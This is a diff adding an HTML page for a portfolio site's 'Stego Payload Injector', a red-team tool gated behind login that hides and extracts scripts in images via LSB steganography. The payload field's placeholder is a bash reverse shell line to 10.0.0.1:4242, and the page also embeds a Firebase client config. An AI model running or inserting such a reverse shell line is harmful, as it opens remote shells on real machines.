@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<title>Stego Payload Injector | sambit.page</title>
+<meta name="robots" content="noindex,nofollow"/>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet"/>
+<link rel="stylesheet" href="style.css"/>
+</head>
+<body>
+
+<nav>
+  <span class="nav-brand">sambit.page</span>
+  <div class="nav-links">
+    <a href="/">← Portfolio</a>
+    <a href="/ascii-converter/">ASCII Studio</a>
+    <a href="/netprobe/">NetProbe</a>
+    <a href="/stego-payload/" class="active">Stego Injector</a>
+  </div>
+  <span class="pulse">RED TEAM</span>
+</nav>
+
+<div style="background: rgba(248, 113, 113, 0.1); border-bottom: 1px solid var(--red); color: var(--red); padding: 0.5rem 1.2rem; font-size: 0.75rem; display: flex; align-items: center; gap: 0.8rem; z-index: 10;">
+  <span style="font-size: 1.1rem;">💡</span>
+  <span><b>Tip:</b> Use "Inject" to hide a malicious script or text inside an image. Use "Extract" on a modified image to reveal the hidden payload!</span>
+</div>
+
+<!-- REQUEST FORM -->
+<div class="state" id="st-request" style="display:none; min-height:80vh; align-items:center; justify-content:center; padding:2rem;">
+  <div class="card">
+    <h2 style="color:var(--red); margin-bottom:0.5rem">Request Access</h2>
+    <p style="font-size:0.8rem; color:var(--dim); margin-bottom:1.5rem">You're logged in but haven't requested Stego Injector access yet.</p>
+    <form id="req-form">
+      <div class="field">
+        <label>Reason for access</label>
+        <textarea id="req-reason" required placeholder="Why do you need this Red Team tool?"></textarea>
+      </div>
+      <button type="submit" class="btn btn-red" id="req-btn" style="width:100%">Submit Request</button>
+    </form>
+    <div class="msg" id="req-msg"></div>
+  </div>
+</div>
+
+<!-- PENDING -->
+<div class="state" id="st-pending" style="display:none; min-height:80vh; align-items:center; justify-content:center; padding:2rem;">
+  <div class="card" style="text-align:center">
+    <h2 style="color:var(--dim); margin-bottom:0.5rem">Request Submitted</h2>
+    <p style="font-size:0.8rem; color:var(--dim); margin-bottom:1.5rem">Your access request is under review by the Administrator.</p>
+    <a href="/" class="btn btn-outline" style="border:1px solid var(--border); padding:0.5rem 1rem">← Portfolio</a>
+  </div>
+</div>
+
+<!-- REJECTED -->
+<div class="state" id="st-rejected" style="display:none; min-height:80vh; align-items:center; justify-content:center; padding:2rem;">
+  <div class="card" style="text-align:center">
+    <h2 style="color:var(--red); margin-bottom:0.5rem">Access Denied</h2>
+    <p style="font-size:0.8rem; color:var(--dim); margin-bottom:1.5rem">Your request was not approved.</p>
+    <a href="/" class="btn btn-outline" style="border:1px solid var(--border); padding:0.5rem 1rem">← Portfolio</a>
+  </div>
+</div>
+
+<main id="st-app" style="display:none;">
+  <header>
+    <div class="eyebrow">// COVERT OPERATIONS</div>
+    <h1>STEGO PAYLOAD INJECTOR</h1>
+    <p class="sub">Embed and extract malicious payloads or secret text inside innocent-looking images using LSB (Least Significant Bit) steganography.</p>
+  </header>
+
+  <div class="tabs">
+    <button class="tab active" onclick="setMode('inject')" id="tab-inject">Inject Payload</button>
+    <button class="tab" onclick="setMode('extract')" id="tab-extract">Extract Payload</button>
+  </div>
+
+  <div class="panel" id="panel-inject">
+    <div class="field">
+      <label>1. Target Carrier Image (PNG/JPG)</label>
+      <div class="dropzone" id="drop-inject" onclick="document.getElementById('file-inject').click()">
+        Click to upload or drag image here
+      </div>
+      <input type="file" id="file-inject" accept="image/*" hidden />
+      <img id="preview-inject" class="preview" alt="Preview"/>
+    </div>
+
+    <div class="field">
+      <label>2. Payload (Script / Text)</label>
+      <textarea id="payload-input" placeholder="e.g., bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"></textarea>
+      <div class="status" id="capacity-status">Capacity: 0 bytes</div>
+    </div>
+
+    <button class="btn btn-red" id="btn-inject" disabled>Inject & Download PNG</button>
+    <div class="msg" id="msg-inject"></div>
+  </div>
+
+  <div class="panel" id="panel-extract" style="display: none;">
+    <div class="field">
+      <label>1. Upload Infected Image (PNG only)</label>
+      <div class="dropzone" id="drop-extract" onclick="document.getElementById('file-extract').click()">
+        Click to upload infected PNG
+      </div>
+      <input type="file" id="file-extract" accept="image/png" hidden />
+      <img id="preview-extract" class="preview" alt="Preview"/>
+    </div>
+
+    <button class="btn btn-red" id="btn-extract" disabled>Extract Payload</button>
+    <div class="msg" id="msg-extract"></div>
+
+    <div class="field" style="margin-top: 1.5rem;">
+      <label>Extracted Payload</label>
+      <textarea id="payload-output" readonly placeholder="Extracted code will appear here..."></textarea>
+    </div>
+  </div>
+</main>
+
+<canvas id="canvas" hidden></canvas>
+
+<!-- Portfolio AI Agent -->
+<link rel="stylesheet" href="/chatbot.css">
+<script type="module" src="/chatbot.js"></script>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.11.0/firebase-app.js";
+import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.11.0/firebase-auth.js";
+import { getFirestore, doc, getDoc, setDoc } from "https://www.gstatic.com/firebasejs/10.11.0/firebase-firestore.js";
+
+const _fbApp = initializeApp({
+  apiKey:"AIzaSyAvwVd19ucMaKp_WsYDSVU0hzu5asHhS1k",
+  authDomain:"sambit-portfolio.firebaseapp.com",
+  projectId:"sambit-portfolio",
+  storageBucket:"sambit-portfolio.firebasestorage.app",
+  messagingSenderId:"98909249081",
+  appId:"1:98909249081:web:00bdbda2f0ed56a2c177e8"
+});
+const auth = getAuth(_fbApp);
+const db = getFirestore(_fbApp);
+
+function show(id) {
+  document.getElementById('st-request').style.display = 'none';
+  document.getElementById('st-pending').style.display = 'none';
+  document.getElementById('st-rejected').style.display = 'none';
+  document.getElementById('st-app').style.display = 'none';
+  document.getElementById(id).style.display = 'flex';
+}
+
+onAuthStateChanged(auth, async user => {
+  if (!user) { window.location.href = '/stego-payload/'; return; }
+  
+  const uSnap = await getDoc(doc(db, 'users', user.uid));
+  
+  if (!uSnap.exists() || !uSnap.data().stego_status) {
+    show('st-request');
+  } else {
+    const s = uSnap.data().stego_status;
+    if (s === 'approved') show('st-app');
+    else if (s === 'pending') show('st-pending');
+    else if (s === 'rejected') show('st-rejected');
+    else show('st-request');
+  }
+
+  const reqForm = document.getElementById('req-form');
+  if (reqForm) {
+    reqForm.onsubmit = async e => {
+      e.preventDefault();
+      const btn = document.getElementById('req-btn');
+      btn.disabled = true;
+      btn.textContent = 'Submitting...';
+      try {
+        await setDoc(doc(db, 'users', user.uid), {
+          stego_status: 'pending',
+          stego_reason: document.getElementById('req-reason').value.trim(),
+          email: user.email,
+          displayName: user.displayName || 'Unknown'
+        }, { merge: true });
+        show('st-pending');
+      } catch (err) {
+        console.error(err);
+        btn.disabled = false;
+        btn.textContent = 'Submit Request';
+        const msg = document.getElementById('req-msg');
+        msg.textContent = 'Error submitting request.';
+        msg.className = 'msg err show';
+      }
+    };
+  }
+});
+</script>
+<script src="app.js"></script>
+</body>
+</html>
